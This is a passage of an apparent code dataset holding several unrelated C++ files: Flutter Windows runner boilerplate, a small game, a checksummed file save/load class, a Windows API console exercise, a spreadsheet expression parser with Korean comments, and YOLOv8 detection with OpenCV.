y, 90, 270, 5);\r\n\t\tpieslice(x + 40, y, 270, 90, 5);\r\n\t}\r\n\r\n\r\n};\r\n//end structure definitions\r\n\r\n\r\n\r\n//Function prototypes\r\nvoid welcomeScreen();\r\nvoid drawHoop(int, int);\r\nvoid initPlatform(Platform&, double, double, int);\r\nvoid bounceball(Landed, Player&, Platform&);\r\nvoid drawPlatform(double, double);\r\nvoid displayScore(int, int, int);\r\nvoid setCosmos(int[], int[]);\r\nvoid drawCosmos(int [], int[]);\r\n\r\nint main()\r\n{\r\n\tbool keepGoing = true;\r\n\tbool movingPlatforms = false;\r\n\tdouble platformVel = 0;\r\n\tchar keyPressed;\r\n\tint score = 0;\r\n\tint xArray[500];\r\n\tint yArray[500];\r\n\r\n\r\n\r\n\tinitwindow(500, 800, (char*)\"Cosmic Climb\", 10, 10);\r\n\r\n  \tsetCosmos(xAr",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"mypdf\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"DataLoadSave.h\"\r\n\r\n\r\nDataLoadSave::DataLoadSave()\r\n:m_seed(777){}\r\n\r\nint DataLoadSave::SaveData(const std::string& filepath, void* data, uint64_t size)\r\n{\r\n\t//Open file for writing in binary mode\r\n\tstd::ofstream file(filepath, std::ios_base::binary | std::ios_base::out);\r\n\t\r\n\t//Check if failed to open file\r\n\tif (file.fail())\r\n\t\treturn FILE_OPEN_FAIL;\r\n\r\n\t//Generate a hash\r\n\tXXHash64 hasher(m_seed);\r\n\thasher.add(data, size);\r\n\r\n\t//Store the hash\r\n\tuint64_t hash = hasher.hash();\r\n\r\n\t//Starting the actual writing of data\r\n\tfile.write((char*)data, size);\r\n\tfile.write((char*)&hash, sizeof(hash));\r\n\r\n\t//Close the file\r\n\tfile.close();\r\n\r\n\t//Return 0 if successful\r\n\treturn SUCCESS;\r\n}\r\n\r\nint DataLoadSave::LoadData(const std::string& filepath, char* src, uint64_t src_size)\r\n{\r\n\t//Open file for Loading data\r\n\tstd::ifstream file(filepath, std::ios_base::binary);\r\n\r\n\t//Check if file is open\r\n\tif (file.fail())\r\n\t\treturn FILE_OPEN_FAIL;\r\n\r\n\t//Start by calculating the file size\r\n\tfile.seekg(0, std::ios::end);\r\n\tuint64_t fsize = file.tellg();\r\n\r\n\t//Reset moved file pointer to start again\r\n\tfile.seekg(0, std::ios::beg);\r\n\r\n\t//if file is empty return -3\r\n\tif (fsize == 0) \r\n\t{\r\n\t\tfile.close();\r\n\t\treturn FILE_EMPTY;\r\n\t}\r\n\r\n\t//Subtract the last 64 bits or 8 bytes of hash to get data struct size\r\n\tuint64_t datasize = fsize - sizeof(uint64_t);\r\n\r\n\tif (datasize > src_size)\r\n\t{\r\n\t\tfile.close();\r\n\t\treturn SRC_SIZE_NOT_SUFFICIENT;\r\n\t}\r\n\r\n\t//Read the file's data into address of src\r\n\tfile.read(src, src_size);\r\n\r\n\t//Read the file checksum stored at the last of the file\r\n\tuint64_t expectedHash = 0;\r\n\tfile.read((char*)&expectedHash, sizeof(expectedHash));\r\n\r\n\t//Generate hash of the read data\r\n\tXXHash64 hasher(m_seed);\r\n\thasher.add(&src, datasize);\r\n\r\n\t//if checksum doesnt match then file is probably corrupted\r\n\tif (expectedHash != hasher.hash())\r\n\t{\r\n\t\tfile.close();\r\n\t\treturn FILE_CORRUPT;\r\n\t}\r\n\r\n\tfile.close();\r\n\treturn SUCCESS;\r\n}\r\n\r\n",
    "#include <iostream>\r\n#include <cstdio>\r\n#include <Windows.h>\r\n#include <cmath>\r\n#include <vector>\r\n#include <string>\r\n#include <iomanip>\r\n#include <algorithm>\r\n#include <bitset>\r\n\r\nusing namespace std;\r\n\r\nvoid formatNumbers() {\r\n    double num;\r\n    for (int count = 0; count < 3;count++) {\r\n        cin >> num;\r\n        if (num >= 1000 || num <= -1000) {\r\n            printf(\"%.2e\\n\", num);\r\n        } else {\r\n            int decDigits = 0;\r\n            double decimal = num - floor(num);\r\n            while (decimal != 0 && decDigits < 10) {\r\n                num *= 10;\r\n                decimal = num - floor(num);\r\n                decDigits++;\r\n            }\r\n            if (decimal == 0) {\r\n                printf(\"%.*f\\n\", max(0, decDigits - 1), num / pow(10, decDigits));\r\n            } else {\r\n                printf(\"%.2f\\n\", num / pow(10, decDigits));\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\n\r\nvoid displayErrorMessage() {\r\n    DWORD errorCode;\r\n    for(int i=1;i<=3;i++){\r\n        cin >> errorCode;\r\n        int help = errorCode;\r\n\r\n        if (help > 0) \r\n        {\r\n            LPSTR errorMessageBuffer = nullptr;\r\n\r\n            FormatMessageA(\r\n                FORMAT_MESSAGE_ALLOCATE_BUFFER |\r\n                FORMAT_MESSAGE_FROM_SYSTEM |\r\n                FORMAT_MESSAGE_IGNORE_INSERTS,\r\n                NULL,\r\n                errorCode,\r\n                MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),\r\n                reinterpret_cast<LPSTR>(&errorMessageBuffer),\r\n                0,\r\n                NULL\r\n            );\r\n\r\n            if (errorMessageBuffer[0] != '\\0') {\r\n                cout << \"Message\"<<\" \"<<help <<\": \" << errorMessageBuffer << endl;\r\n            } else {\r\n                cout << \"No such error exists.\" << endl;\r\n            }\r\n\r\n            LocalFree(errorMessageBuffer);\r\n        }\r\n\r\n        else \r\n        {\r\n            cout << \"No such error exists\" << endl;\r\n            break;\r\n        }\r\n\r\n    }\r\n}\r\n\r\nvoid displaySystemInformation() {\r\n    SYSTEM_INFO systemInfo;\r\n    GetSystemInfo(&systemInfo);\r\n\r\n    cout << \"Number of Logical Processors: \" << systemInfo.dwNumberOfProcessors << endl;\r\n    cout << \"Page size: \" << systemInfo.dwPageSize << \" Bytes\" << endl;\r\n    cout << \"Processor Mask: 0x\" << hex << setw(16) << setfill('0') << systemInfo.dwActiveProcessorMask << dec << endl;\r\n    cout << \"Minimum process address: 0x\" << hex << setw(16) << setfill('0') << reinterpret_cast<uintptr_t>(systemInfo.lpMinimumApplicationAddress) << dec << endl;\r\n    cout << \"Maximum process address: 0x\" << hex << setw(16) << setfill('0') << reinterpret_cast<uintptr_t>(systemInfo.lpMaximumApplicationAddress) << dec << endl;\r\n}\r\n\r\nvoid computeBase64() {\r\n    string text = \"Secure Programming\";\r\n    string base64Chars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\r\n    string base64Result;\r\n\r\n    string binaryText;\r\n    for (char c : text) {\r\n        binaryText += bitset<8>(c).to_string();\r\n    }\r\n\r\n    size_t padding = 0;\r\n    if (binaryText.length() % 3 != 0) {\r\n        padding = 3 - (binaryText.length() % 3);\r\n        binaryText += string(padding, '0');\r\n    }\r\n\r\n    for (size_t i = 0; i < binaryText.length(); i += 6) {\r\n        size_t index = bitset<6>(binaryText.substr(i, 6)).to_ulong();\r\n        base64Result += base64Chars[index];\r\n    }\r\n\r\n    base64Result += string(padding, '=');\r\n\r\n    cout << base64Result << endl;\r\n}\r\n\r\nvoid findPrimes() {\r\n    int number;\r\n    while (cin >> number) {\r\n        if (number == 0)\r\n            break;\r\n\r\n        bool isPrime = true;\r\n        if (number <= 1 || (number > 2 && number % 2 == 0)) {\r\n            isPrime = false;\r\n        } else {\r\n            for (int i = 3; i * i <= number; i += 2) {\r\n                if (number % i == 0) {\r\n                    isPrime = false;\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n        cout << (isPrime ? \"TRUE\" : \"FALSE\") << endl;\r\n    }\r\n}\r\n\r\nint main() {\r\n    int choice;\r\n    do {\r\n        cout << \"1. Formatting the entered number with printf.\\n\";\r\n        cout << \"2. Displaying error messages using Windows API.\\n\";\r\n        cout << \"3. Displaying system information.\\n\";\r\n        cout << \"4. BASE64 computation for \\\"Secure Programming\\\" text.\\n\";\r\n        cout << \"5. Finding prime numbers.\\n\";\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n        case 1:\r\n            formatNumbers();\r\n            choice = 6;\r\n            break;\r\n        case 2:\r\n            displayErrorMessage();\r\n            choice = 6;\r\n            break;\r\n        case 3:\r\n            displaySystemInformation();\r\n            choice = 6;\r\n            break;\r\n        case 4:\r\n            computeBase64();\r\n            choice = 6;\r\n            break;\r\n        case 5:\r\n            findPrimes();\r\n            choice = 6;\r\n            break;\r\n        default:\r\n            break;\r\n        }\r\n    } while (choice != 6);\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"excel.h\"\n#include <fstream>\n\nnamespace MyExcel {\n\tVector::Vector(int n) : data(new string[n]), capacity(n), length(0) {}\n\tvoid Vector::push_back(string s) {\n\t\tif (capacity <= length) {\n\t\t\tstring* tmp = new string[capacity * 2];\n\t\t\tfor (int i = 0; i < length; i++) {\n\t\t\t\ttmp[i] = data[i];\n\t\t\t}\n\t\t\tdelete[] data;\n\t\t\tdata = tmp;\n\t\t\tcapacity *= 2;\n\t\t}\n\t\tdata[length] = s;\n\t\tlength++;\n\t}\n\tstring Vector::operator[](int i) { return data[i]; }\n\tvoid Vector::remove(int x) {\n\t\tfor (int i = x + 1; i < length; i++) {\n\t\t\tdata[i - 1] = data[i];\n\t\t}\n\t\tlength--;\n\t}\n\tint Vector::size() { return length; }\n\tVector::~Vector() {\n\t\tif (data) {\n\t\t\tdelete[] data;\n\t\t}\n\t}\n\n\tStack::Stack() : start(NULL, \"\") { current = &start; }\n\tvoid Stack::push(string s) {\n\t\tNode* n = new Node(current, s);\n\t\tcurrent = n;\n\t}\n\tstring Stack::pop() {\n\t\tif (current == &start)\n\t\t\treturn \"\";\n\n\t\tstring s = current->s;\n\t\tNode* prev = current;\n\t\tcurrent = current->prev;\n\n\t\tdelete prev;\n\t\treturn s;\n\t}\n\tstring Stack::peek() { return current->s; }\n\tbool Stack::is_empty() {\n\t\tif (current == &start)\n\t\t\treturn true;\n\t\treturn false;\n\t}\n\tStack::~Stack() {\n\t\twhile (current != &start) {\n\t\t\tNode* prev = current;\n\t\t\tcurrent = current->prev;\n\t\t\tdelete prev;\n\t\t}\n\t}\n\tNumStack::NumStack() : start(NULL, 0) { current = &start; }\n\tvoid NumStack::push(double s) {\n\t\tNode* n = new Node(current, s);\n\t\tcurrent = n;\n\t}\n\tdouble NumStack::pop() {\n\t\tif (current == &start)\n\t\t\treturn 0;\n\n\t\tdouble s = current->s;\n\t\tNode* prev = current;\n\t\tcurrent = current->prev;\n\n\t\tdelete prev;\n\t\treturn s;\n\t}\n\tdouble NumStack::peek() { return current->s; }\n\tbool NumStack::is_empty() {\n\t\tif (current == &start)\n\t\t\treturn true;\n\t\treturn false;\n\t}\n\tNumStack::~NumStack() {\n\t\twhile (current != &start) {\n\t\t\tNode* prev = current;\n\t\t\tcurrent = current->prev;\n\t\t\tdelete prev;\n\t\t}\n\t}\n\n\t// Myexcel\n\t// Cell \ud074\ub798\uc2a4(\ucd94\uc0c1_) \n\tCell::Cell(int x, int y, Table* table)\n\t\t: x(x), y(y), table(table) {}\n\n\t// StringCell\n\tStringCell::StringCell(string data, int x, int y, Table* t)\n\t\t: data(data), Cell(x, y, t) {}\n\tstring StringCell::stringify() { return data; }\n\tint StringCell::to_numeric() { return 0; }\n\n\t// NumberCell\n\tNumberCell::NumberCell(int data, int x, int y, Table* t)\n\t\t: data(data), Cell(x, y, t) {}\n\tstring NumberCell::stringify() { return to_string(data); }\n\tint NumberCell::to_numeric() { return data; }\n\n\t// *** DateCell\n\tDateCell::DateCell(string s, int x, int y, Table* t) : Cell(x, y, t) {\n\t\t// Date format => yyyy-mm-dd\n\t\t// time_t \uac12\uc73c\ub85c \ubcc0\ud658\ud560 \ub0a0\uc9dc\n\t\tint year = atoi(s.c_str());\n\t\tint month = atoi(s.c_str()+5);\n\t\tint day = atoi(s.c_str()+8);\n\n\t\t// struct tm(tm \uad6c\uc870\uccb4) : \uc0ac\ub78c\uc774 \uc0ac\uc6a9\ud558\ub294 \ub0a0\uc9dc \uac1c\ub150 \uc801\uc6a9\ud55c \uad6c\uc870\uccb4\n\t\ttm timeinfo;\n\n\t\ttimeinfo.tm_year = year - 1900;\n\t\ttimeinfo.tm_mon = month - 1;\n\t\ttimeinfo.tm_mday = day;\n\t\ttimeinfo.tm_hour = 0;\n\t\ttimeinfo.tm_min = 0;\n\t\ttimeinfo.tm_sec = 0;\n\n\t\t// tm -> time_t \uac12\uc73c\ub85c \ubcc0\ud658\n\t\tdata = mktime(&timeinfo); \n\t}\n\n\tstring DateCell::stringify() {\n\t\tchar buf[50];\n\t\ttm temp;\n\t\t// localtime_s : \uc2e4\ud589 \uc2dc\uc810\uc758 \uac12\n\t\t// time_t \ud615\uc2dd\uc744 \ub144\uc6d4\uc77c\uc2dc\ubd84\ucd08 \ud615\ud0dc\ub85c \ubd84\ud560\ud55c \uc77c\uc2dc(struct tm \ud615\uc2dd)\ub85c \ubcc0\ud658\n\t\t// \uba64\ubc84\uac00 \uc788\ub294 tm \uad6c\uc870\uccb4\uc5d0 \ub300\ud55c \ud3ec\uc778\ud130 \ubc18\ud658\n\t\tlocaltime_s(&temp, &data);\n\t\t// string\uc73c\ub85c \ubc18\ud658\n\t\t// %F => ISO \ub0a0\uc9dc \ud615\uc2dd(%Y-%m-%d\uc640 \ub3d9\uc77c).\n\t\tstrftime(buf, 50, \"%F\", &temp);\n\n\t\treturn string(buf);\n\t}\n\n\tint DateCell::to_numeric() {\n\t\t// \ud0c0\uc785 \uce90\uc2a4\ud2b8 \uc5f0\uc0b0\uc790\n\t\treturn static_cast<int>(data);\n\t}\n\n\tExprCell::ExprCell(string data, int x, int y, Table* t)\n\t\t: data(data), Cell(x, y, t), parsed_expr(new MyExcel::Vector()) {\n\t\t// \uc0dd\uc131\uc790\uc5d0\uc11c \uc218\uc2dd\uc744 \ud30c\uc2f1\ud558\uc5ec exp_vec \uc5d0 \uc800\uc7a5\n\t\tparse_expression();\n\t}\n\n\tExprCell::~ExprCell() {\n\t\tif (parsed_expr) {\n\t\t\tdelete[] parsed_expr;\n\t\t\tparsed_expr = nullptr;\n\t\t}\n\t}\n\n\tint ExprCell::precedence(char c) {\n\t\tswitch (c) {\n\t\tcase '(':\n\t\tcase '[':\n\t\tcase '{':\n\t\t\treturn 0;\n\t\tcase '+':\n\t\tcase '-':\n\t\t\treturn 1;\n\t\tcase '*':\n\t\tcase '/':\n\t\t\treturn 2;\n\t\t}\n\t\treturn 0;\n\t}\n\n\tvoid ExprCell::parse_expression() {\n\t\tStack stack;\n\t\t\n\t\t// \uc218\uc2dd \uc804\uccb4\ub97c ()\ub85c \ubb36\uace0 exp_vec \uc5d0 \ub0a8\uc544\uc788\ub294 \uc5f0\uc0b0\uc790\ub4e4\uc774 push \ub418\ub3c4\ub85d... (data \uac12)\n\t\tdata.insert(0, \"(\");\n\t\tdata.push_back(')');\t\t\n\n\t\tfor (int i = 0; i < data.length(); i++) {\n\t\t\t// isalpha : \uc54c\ud30c\ubcb3\uc778\uc9c0 => \ub300\ubd84\uc790\uba74 1, \uc18c\ubb38\uc790\uba74 2, \uc544\ub2c8\uba74 0 \ubc18\ud658\n\t\t\tif (isalpha(data[i])) {\n\t\t\t\texp_vec.push_back(data.substr(i, 2));\n\t\t\t\ti++;\n\t\t\t}\n\t\t\telse if (isdigit(data[i])) {\n\t\t\t\texp_vec.push_back(data.substr(i, 1));\n\t\t\t}\n\t\t\telse if (data[i] == '(' || data[i] == '[' || data[i] == '{') {\n\t\t\t\tstack.push(data.substr(i, 1));\n\t\t\t}\n\t\t\telse if (data[i] == ')' || data[i] == ']' || data[i] == '}') {\n\t\t\t\tstring t = stack.pop();\n\t\t\t\twhile (t != \"(\" && t != \"[\" && t != \"{\") {\n\t\t\t\t\texp_vec.push_back(t);\n\t\t\t\t\tt = stack.pop();\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if (data[i] == '+' || data[i] == '-' || data[i] == '*' || data[i] == '/') {\n\t\t\t\twhile (!stack.is_empty() && precedence(stack.peek()[0]) >= precedence(data[i])) {\n\t\t\t\t\texp_vec.push_back(stack.pop());\n\t\t\t\t}\n\t\t\t\tstack.push(data.substr(i, 1));\n\t\t\t}\n\t\t}\t\t\n\t\t// parsed_expr \uc5d0 exp_vec \uc8fc\uc18c \ud560\ub2f9 =================================================================================>>>>\n\t\t// std::string* Myexcel::ExprCell << Myexcel::Vector Myexcel::ExprCell\t\t\n\t\t// ==> parsed_expr\ub97c Vector* \ub85c \ubc14\uafc8 (excel.h \ud655\uc778)\n\t\t\n\t\tparsed_expr = &exp_vec;\n\t}\n\n\t//",
    "#include <fstream>\r\n#include <opencv2/core/mat.hpp>\r\n#include <opencv2/opencv.hpp>\r\nusing namespace std;\r\nusing namespace cv;\r\nusing namespace cv::dnn;\r\n/******************************************************************************************************************/\r\nconst float INPUT_WIDTH = 640.0;\r\nconst float INPUT_HEIGHT = 480.0;\r\nconst float SCORE_THRESHOLD = 0.45;\r\nconst float NMS_THRESHOLD = 0.5;\r\nconst float CONFIDENCE_THRESHOLD = 0.25;\r\n\r\n// Text parameters.\r\nconst float FONT_SCALE = 0.7;\r\nconst int FONT_FACE = FONT_HERSHEY_SIMPLEX;\r\nconst int THICKNESS = 1;\r\n\r\n// Colors.\r\n//const std::vector<cv::Scalar> colors = { cv::Scalar(255, 255, 0), cv::Scalar(0, 255, 0), cv::Scalar(0, 255, 255), cv::Scalar(255, 0, 0) };\r\nScalar BLACK = Scalar(0, 0, 0);\r\nScalar BLUE = Scalar(255, 178, 50);\r\nScalar YELLOW = Scalar(0, 255, 255);\r\nScalar RED = Scalar(0, 0, 255);\r\n/******************************************************************************************************************/\r\nvoid draw_label(Mat& input_image, string label, int left, int top)\r\n{\r\n    // Display the label at the top of the bounding box.\r\n    int baseLine;\r\n    Size label_size = getTextSize(label, FONT_FACE, FONT_SCALE, THICKNESS, &baseLine);\r\n    top = max(top, label_size.height);\r\n    // Top left corner.\r\n    Point tlc = Point(left, top);\r\n    // Bottom right corner.\r\n    Point brc = Point(left + label_size.width, top + label_size.height + baseLine);\r\n    // Draw white rectangle.\r\n    rectangle(input_image, tlc, brc, BLACK, FILLED);\r\n    // Put the label on the black rectangle.\r\n    putText(input_image, label, Point(left, top + label_size.height), FONT_FACE, FONT_SCALE, YELLOW, THICKNESS);\r\n}\r\n/******************************************************************************************************************/\r\nstd::vector<std::string> load_class_list()\r\n{\r\n    std::vector<std::string> class_list;\r\n    std::ifstream ifs(\"classes.txt\");\r\n    std::string line;\r\n    while (getline(ifs, line))\r\n    {\r\n        class_list.push_back(line);\r\n    }\r\n    return class_list;\r\n}\r\n/******************************************************************************************************************/\r\nvoid load_net(cv::dnn::Net& net, bool is_cuda)\r\n{\r\n    auto result = cv::dnn::readNet(\"yolov8s.onnx\");\r\n\r\n    if (is_cuda)\r\n    {\r\n        std::cout << \"Running on GPU using CUDA\\n\";\r\n        result.setPreferableBackend(cv::dnn::DNN_BACKEND_CUDA);\r\n        result.setPreferableTarget(cv::dnn::DNN_TARGET_CUDA_FP16);\r\n    }\r\n    else\r\n    {\r\n        std::cout << \"Running on CPU\\n\";\r\n        result.setPreferableBackend(cv::dnn::DNN_BACKEND_OPENCV);\r\n        result.setPreferableTarget(cv::dnn::DNN_TARGET_CPU);\r\n    }\r\n    net = result;\r\n}\r\n\r\n/******************************************************************************************************************/\r\nvector<Mat> pre_process(Mat& input_image, Net& net)\r\n{\r\n    //Convert to blob.\r\n    Mat blob;\r\n    blobFromImage(input_image, blob, 1. / 255., Size(INPUT_WIDTH, INPUT_HEIGHT), Scalar(), true, false);\r\n    net.setInput(blob);\r\n    vector<Mat> outputs;\r\n    if (!blob.empty()) \r\n\t{\r\n        net.forward(outputs, net.getUnconnectedOutLayersNames());\r\n    }\r\n\r\n    return outputs;\r\n}\r\n/******************************************************************************************************************/\r\nMat post_process(Mat& input_image, vector<Mat>& outputs, const vector<string>& class_name)\r\n{\r\n    // Initialize vectors to hold respective outputs while unwrapping     detections.\r\n    vector<int> class_ids;\r\n    vector<float> confidences;\r\n    vector<Rect> boxes;\r\n\r\n    int rows = outputs[0].size[2];\r\n    int dimensions = outputs[0].size[1];\r\n\r\n    outputs[0] = outputs[0].reshape(1, dimensions);\r\n    cv::transpose(outputs[0], outputs[0]);\r\n\r\n    float* data = (float*)outputs[0].data;\r\n\r\n    // Resizing factor.\r\n    float x_factor = input_image.cols / INPUT_WIDTH;\r\n    float y_factor = input_image.rows / INPUT_HEIGHT;\r\n\r\n    // Iterate through  detections.\r\n    //cout << \"num detections  : \" << rows << \" \" << dimensions << endl;\r\n    for (int i = 0; i < rows; ++i)\r\n    {\r\n        float* classes_scores = data + 4;\r\n\r\n        cv::Mat scores(1, class_name.size(), CV_32FC1, classes_scores);\r\n        cv::Point class_id;\r\n        double maxClassScore;\r\n\r\n        minMaxLoc(scores, 0, &maxClassScore, 0, &class_id);\r\n\r\n        if (maxClassScore > SCORE_THRESHOLD)\r\n        {\r\n            confidences.push_back(maxClassScore);\r\n            class_ids.push_back(class_id.x);\r\n\r\n            float x = data[0];\r\n            float y = data[1];\r\n            float w = data[2];\r\n            float h = data[3];\r\n\r\n            int left = int((x - 0.5 * w) * x_factor);\r\n            int top = int((y - 0.5 * h) * y_factor);\r\n\r\n            int width = int(w * x_factor);\r\n            int height = int(h * y_factor);\r\n\r\n            boxes.push_back(cv::Rect(left, top, width, height));\r\n        }\r\n\r\n        data += dimensions;\r\n    }\r\n    // Perform Non-Maxi",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
